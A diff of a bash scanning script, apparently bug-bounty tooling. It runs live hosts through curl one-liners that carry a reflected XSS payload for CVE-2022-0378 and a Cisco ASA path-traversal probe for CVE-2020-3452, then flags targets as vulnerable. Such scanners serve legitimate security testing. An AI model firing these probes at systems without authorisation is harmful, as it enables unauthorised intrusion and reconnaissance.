@@ -26,7 +26,7 @@ cat op.txt | sort -u | tee -a all.txt
 cat all.txt | httprobe | tee -a alive2.txt
 cat alive2.txt | sort -u | tee -a alive.txt
 
-cat alive2.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done | tee -a cve-2022-0378.txt
+cat alive2.txt | while read h do; do curl -s -k "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -q "onmouse" && echo "$h: VULNERABLE"; done | tee -a cve-2022-0378.txt
 while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < alive2.txt | tee -a cve-2020-3452.txt
 
 
